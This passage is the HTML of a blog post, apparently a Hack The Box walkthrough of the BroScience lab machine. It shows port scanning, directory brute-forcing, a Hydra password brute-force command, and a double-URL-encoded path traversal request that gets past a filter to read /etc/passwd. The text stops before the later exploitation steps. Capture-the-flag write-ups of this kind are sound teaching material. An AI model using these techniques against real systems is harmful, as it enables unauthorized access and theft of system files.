<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - BroScience" />
<meta property="og:locale" content="en" />
<meta name="description" content="In this box, I had to exploit an LFI, a vulnerable token generation, and a serialization vulnerability to get to a shell. Then I had to crack a hashed password, and finally, get code execution in a script running as root." />
<meta property="og:description" content="In this box, I had to exploit an LFI, a vulnerable token generation, and a serialization vulnerability to get to a shell. Then I had to crack a hashed password, and finally, get code execution in a script running as root." />
<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Walkthrough-BroScience/" />
<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Walkthrough-BroScience/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/assets/images/BroScience/Bro.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-08T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/BroScience/Bro.png" />
<meta property="twitter:title" content="Hack The Box - BroScience" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-08T00:00:00+08:00","datePublished":"2023-04-08T00:00:00+08:00","description":"In this box, I had to exploit an LFI, a vulnerable token generation, and a serialization vulnerability to get to a shell. Then I had to crack a hashed password, and finally, get code execution in a script running as root.","headline":"Hack The Box - BroScience","image":"http://localhost:4000/assets/images/BroScience/Bro.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Walkthrough-BroScience/"},"url":"http://localhost:4000/posts/HackTheBox-Walkthrough-BroScience/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - BroScience | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">𝐄𝐭𝐡𝐢𝐜𝐚𝐥 𝐇𝐚𝐜𝐤𝐞𝐫 || 𝐒𝐨𝐟𝐭𝐰𝐚𝐫𝐞 𝐄𝐧𝐠𝐢𝐧𝐞𝐞𝐫 || 𝐂𝐲𝐛𝐞𝐫 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐑𝐞𝐬𝐚𝐫𝐜𝐡𝐞𝐫.!! 𝐎𝐒𝐂𝐏 & 𝐎𝐒𝐄𝐏.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Hack The Box - BroScience</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - BroScience</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1680883200"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Apr  8, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/assets/images/BroScience/Bro.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="4448 words">
  <em>24 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>In this box, I had to exploit an LFI, a vulnerable token generation, and a serialization vulnerability to get to a shell. Then I had to crack a hashed password, and finally, get code execution in a script running as root.</p>

<ul>
  <li>Room: BroScience</li>
  <li>Difficulty: Medium</li>
  <li>URL: <a href="https://app.hackthebox.com/machines/BroScience">https://app.hackthebox.com/machines/BroScience</a></li>
  <li>Author: <a href="https://app.hackthebox.com/users/485051">bmdyy</a></li>
</ul>

<h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I began the box by scanning for open ports.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">-a</span> target <span class="nt">--</span> <span class="nt">-A</span> | <span class="nb">tee </span>rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
_______________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span>
Open 10.10.11.195:22
Open 10.10.11.195:80
Open 10.10.11.195:443
<span class="o">[</span>~] Starting Script<span class="o">(</span>s<span class="o">)</span>
<span class="o">[&gt;]</span> Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>

<span class="o">[</span>~] Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-29 08:25 EST
NSE: Loaded 155 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
...
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDB5dEat1MGh3CDDnkl4tdWQcTpdWZYHZj5/Orv3PDjSiQ4dg1i35kknwiZrXLiMsUu/4TigP9Kc3h4M1CS7E3/GprpWxuGmipEucoQuNEtaM0sUa8xobtFxOVF46kS0++ozTd4+zbSLsu73SlLcSuSFalhGnHteHj6/ksSeX642103SMqkkmEu/cbgofkoqQOCY
k3Qa42bZq5bjS/auGAlPoAxTjjVtpHnXOKOU7M6gkewD91FB3GAMUdwqR/PJcA5xqGFZm2St9ecSbewCur6pLN5YKnNhvdID4ijWI22gu5pLxHL9XjORMbSUkJbB79VoYJZaNkdOgt+HXR67s9DWI47D6/+pO0dTfQgMFgOCxYheWMDQ2FuyHyGX1CZpMVLAo3sjOvxAqk7eUGutsyBAlYCD4lhSFs6RhSBynahHQah
7+Lv5LKRriZe/fQIgrJrQj+tR4Uhz89eWGrXK9bjN22wy7tVkMG/w5dOwo7S3Wi0aTZfd/17D0z7wSdiAiE<span class="o">=</span>
|   256 3f8a56f8958faeafe3ae7eb880f679d2 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCgM9UKdxFmXRJESXdlb+BSl+K1F0YCkOjSa8l+tgD6Y3mslSfrawZkdfq8NKLZlmOe8uf1ykgXjLWVDQ9NrJBk<span class="o">=</span>
|   256 3c6575274ae2ef9391374cfdd9d46341 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMwR+IfRojCwiMuM3tZvdD5JCD2MRVum9frUha60bkN
80/tcp  open  http     syn-ack Apache httpd 2.4.54
|_http-title: Did not follow redirect to https://broscience.htb/
|_http-server-header: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack Apache httpd 2.4.54 <span class="o">((</span>Debian<span class="o">))</span>
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|_  http/1.1
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="nb">set</span>
|_http-server-header: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: BroScience : Home
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>broscience.htb/organizationName<span class="o">=</span>BroScience/countryName<span class="o">=</span>AT/emailAddress<span class="o">=</span>administrator@broscience.htb/localityName<span class="o">=</span>Vienna
| Issuer: <span class="nv">commonName</span><span class="o">=</span>broscience.htb/organizationName<span class="o">=</span>BroScience/countryName<span class="o">=</span>AT/emailAddress<span class="o">=</span>administrator@broscience.htb/localityName<span class="o">=</span>Vienna
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-14T19:48:36
| Not valid after:  2023-07-14T19:48:36
| MD5:   5328ddd62f3429d11d26ae8a68d86e0c
| SHA-1: 20568d0d9e4109cde5a22021fe3f349c40d8d75b
| <span class="nt">-----BEGIN</span> CERTIFICATE-----
...
|_-----END CERTIFICATE-----
Service Info: Host: broscience.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 08:25
Completed NSE at 08:25, 0.00s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 08:25
Completed NSE at 08:25, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 08:25
Completed NSE at 08:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.49 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>It found three open ports.</p>
<ul>
  <li>22 - SSH</li>
  <li>80 - HTTP</li>
  <li>443 - HTTPS</li>
</ul>

<p>I looked at the site on port 80 and was redirected to ‘https://broscience.htb/’. I added the domain to my hosts file.</p>

<p>I launched Feroxbuster to check for hidden pages.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> https://broscience.htb/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-x</span> php <span class="nt">-o</span> ferox.txt <span class="nt">-k</span> <span class="nt">-s</span> 200,204,301,302,307,308,401,405

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://broscience.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 405]
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 💲  Extensions            │ <span class="o">[</span>php]
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🔓  Insecure              │ <span class="nb">true</span>
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      321c https://broscience.htb/includes <span class="o">=&gt;</span> https://broscience.htb/includes/
301      GET        9l       28w      319c https://broscience.htb/images <span class="o">=&gt;</span> https://broscience.htb/images/
200      GET      147l      510w        0c https://broscience.htb/
200      GET       42l       97w     1936c https://broscience.htb/login.php
200      GET      147l      510w        0c https://broscience.htb/index.php
200      GET       45l      104w     2161c https://broscience.htb/register.php
200      GET       29l       70w     1309c https://broscience.htb/user.php
302      GET        0l        0w        0c https://broscience.htb/logout.php <span class="o">=&gt;</span> https://broscience.htb/index.php
302      GET        1l        3w       13c https://broscience.htb/comment.php <span class="o">=&gt;</span> https://broscience.htb/login.php
301      GET        9l       28w      319c https://broscience.htb/styles <span class="o">=&gt;</span> https://broscience.htb/styles/
301      GET        9l       28w      323c https://broscience.htb/javascript <span class="o">=&gt;</span> https://broscience.htb/javascript/
301      GET        9l       28w      319c https://broscience.htb/manual <span class="o">=&gt;</span> https://broscience.htb/manual/
301      GET        9l       28w      326c https://broscience.htb/manual/images <span class="o">=&gt;</span> https://broscience.htb/manual/images/
...
200      GET       28l       66w     1256c https://broscience.htb/activate.php
301      GET        9l       28w      331c https://broscience.htb/manual/en/programs <span class="o">=&gt;</span> https://broscience.htb/manual/en/programs/
301      GET        9l       28w      332c https://broscience.htb/manual/ru/developer <span class="o">=&gt;</span> https://broscience.htb/manual/ru/developer/
<span class="o">[</span><span class="c">####################] - 58s  3154400/3154400 0s      found:33      errors:1257183</span>
<span class="o">[</span><span class="c">####################] - 56s   126176/126176  2432/s  https://broscience.htb/</span>
<span class="o">[</span><span class="c">####################] - 0s    126176/126176  0/s     https://broscience.htb/includes/ =&gt; Directory listing (add -e to scan)</span>
<span class="o">[</span><span class="c">####################] - 0s    126176/126176  0/s     https://broscience.htb/images/ =&gt; Directory listing (add -e to scan)</span>
<span class="o">[</span><span class="c">####################] - 0s    126176/126176  0/s     https://broscience.htb/styles/ =&gt; Directory listing (add -e to scan)</span>
<span class="o">[</span><span class="c">####################] - 55s   126176/126176  2433/s  https://broscience.htb/javascript/</span>
<span class="o">[</span><span class="c">####################] - 54s   126176/126176  2578/s  https://broscience.htb/manual/</span>
<span class="o">[</span><span class="c">####################] - 0s    126176/126176  0/s     https://broscience.htb/manual/images/ =&gt; Directory listing (add -e to scan)</span>
<span class="o">[</span><span class="c">####################] - 55s   126176/126176  2297/s  https://broscience.htb/manual/en/</span>
<span class="o">[</span><span class="c">####################] - 0s    126176/126176  0/s     https://broscience.htb/manual/style/ =&gt; Directory listing (add -e to scan)</span>
<span class="o">[</span><span class="c">####################] - 53s   126176/126176  2547/s  https://broscience.htb/manual/en/misc/</span>
<span class="o">[</span><span class="c">####################] - 50s   126176/126176  2601/s  https://broscience.htb/manual/de/</span>
...
<span class="o">[</span><span class="c">####################] - 48s   126176/126176  2616/s  https://broscience.htb/manual/ru/developer/</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="local-file-inclusion-lfi"><span class="mr-2">Local File Inclusion (LFI)</span><a href="#local-file-inclusion-lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I opened ‘https://broscience.htb’ in my browser.</p>

<p><img data-src="/assets/images/BroScience/MainSite.png" alt="Main Site" title="Main Site" data-proofer-ignore></p>

<p>I looked around the site. The user page appears to allow user enumeration.</p>

<p><img data-src="/assets/images/BroScience/Users.png" alt="Users" title="Users" data-proofer-ignore></p>

<p>I extracted the list of users and tried to brute-force the login page with Hydra.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>usernames.txt
administrator
bill
michael
john
dmytro

<span class="nv">$ </span>hydra <span class="nt">-L</span> usernames.txt <span class="nt">-P</span> /usr/share/seclists/rockyou.txt <span class="nt">-u</span> <span class="nt">-e</span> sr <span class="nt">-s</span> 443 <span class="nt">-m</span> <span class="s1">'/login.php:username=^USER^&amp;password=^PASS^:incorrect'</span> broscience.htb https-post-form
...
</pre></td></tr></tbody></table></code></div></div>

<p>It ran for a while and failed to find a working password.</p>

<p>Next, I tried registering a user. But it needed activation of the account through a link sent by email.</p>

<p><img data-src="/assets/images/BroScience/Register.png" alt="Register" title="Register" data-proofer-ignore></p>

<p>I kept looking around. Eventually, I saw the image’s URL: <code class="language-plaintext highlighter-rouge">https://broscience.htb/includes/img.php?path=bench.png</code>. This looked like it could be vulnerable to LFI.</p>

<p>I tried loading <code class="language-plaintext highlighter-rouge">https://broscience.htb/includes/img.php?path=/etc/passwd</code>. The paged showed <code class="language-plaintext highlighter-rouge">Error: Attack detected</code>.</p>

<p>I tried encoding the slashes, it gave me the same error. I kept playing with it, I needed to double URL encode the slashes to get the file.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">broscience.htb</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=6drat5f8omo5h6l5hmjinrcdai</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">document</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">none</span>
<span class="na">Sec-Fetch-User</span><span class="p">:</span> <span class="s">?1</span>
<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
